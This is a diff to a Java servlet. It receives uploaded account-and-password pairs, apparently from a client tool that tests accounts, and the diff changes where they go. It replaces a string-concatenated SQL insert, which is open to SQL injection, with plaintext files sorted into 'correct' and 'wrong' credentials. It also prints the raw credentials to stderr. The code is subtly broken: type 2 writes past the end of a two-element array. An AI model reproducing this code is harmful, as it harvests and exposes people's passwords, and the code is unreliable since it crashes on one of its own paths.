@@ -1,7 +1,11 @@
 package ws.hoyland.as.servlet;
 
 import java.io.BufferedReader;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.OutputStreamWriter;
 //import java.io.InputStream;
 import java.math.BigInteger;
 import java.security.KeyFactory;
@@ -40,7 +44,9 @@ public class GCServlet extends HttpServlet {
 	private static final long serialVersionUID = 7633331277396719497L;
 	//private static Random RND = new Random();
 	private boolean isByte = false;
+	private BufferedWriter[] outputs = new BufferedWriter[2];
 
+	
 	//private String module = "w5pR+xIC918OIPaRyONwvPp80rdf1YjK2sVJrfHwPP2qzLn7pdchnKSj5A+TJBIUdL6FNVzxeODTvQcZ7fhZ1g0kh0sQX6xz7wZ97pYvXRLH25gwObpe4Bg0eZIxdIhqLEWs/VRBwbL8wgg5UgFsZmMYhFJ1hf9Ea7xPdWBu+Hs=";
 	
 //	private String exponentString = "AQAB";, pbkexp
@@ -51,6 +57,19 @@ public class GCServlet extends HttpServlet {
 	private String modBytes = "C39A51FB1202F75F0E20F691C8E370BCFA7CD2B75FD588CADAC549ADF1F03CFDAACCB9FBA5D7219CA4A3E40F9324121474BE85355CF178E0D3BD0719EDF859D60D24874B105FAC73EF067DEE962F5D12C7DB983039BA5EE0183479923174886A2C45ACFD5441C1B2FCC2083952016C66631884527585FF446BBC4F75606EF87B";
 	
 	public GCServlet() {
+		try{
+			long time = System.currentTimeMillis();
+			String[] sn = new String[]{"C://正确-"+time+".txt", "C://错误-"+time+".txt"};
+			for(int i=0;i<sn.length;i++){
+				File file = new File(sn[i]);
+				if(!file.exists()){
+					file.createNewFile();
+				}
+				outputs[i] = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file)));
+			}
+		}catch(Exception e){
+			e.printStackTrace();
+		}
 	}
 
 	protected void doGet(HttpServletRequest req, HttpServletResponse resp)
@@ -83,7 +102,6 @@ public class GCServlet extends HttpServlet {
 		try {
 			KeyFactory factory = KeyFactory.getInstance("RSA");
 			Cipher cipher = Cipher.getInstance("RSA");
-
 			
 			BufferedReader sis = req.getReader();
 			char[] buf = new char[1024];
@@ -101,7 +119,7 @@ public class GCServlet extends HttpServlet {
 			byte[] fmc = Converts.hexStringToByte(sb.toString().substring(32,
 					96)); // System.out.println("B");
 			String lmc = Converts.bytesToHexString(crypter.decrypt(fmc, key));// 机器码
-			System.out.println(lmc);
+			System.out.println(lmc+" GC");
 			String JNDINAME = "java:comp/env/jdbc/assistants";
 			ResultSet rs = null;
 
@@ -222,9 +240,14 @@ public class GCServlet extends HttpServlet {
 					
 					if("1".equals(action)){
 						if("0".equals(type)||"2".equals(type)){
+							//写文件
+							
 							String[] line = ct.split("----");
-							stmt
-							.executeUpdate("INSERT INTO t_upload (account, pwd, type) VALUES ('"+line[0]+"', '"+line[1]+"', "+type+")");
+							System.err.println("ct="+ct);
+							outputs[Integer.parseInt(type)].write(line[0]+"----"+line[1]+"\r\n");
+							outputs[Integer.parseInt(type)].flush();
+//							stmt
+//							.executeUpdate("INSERT INTO t_upload (account, pwd, type) VALUES ('"+line[0]+"', '"+line[1]+"', "+type+")");
 						}
 						
 						resultString = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFF14";
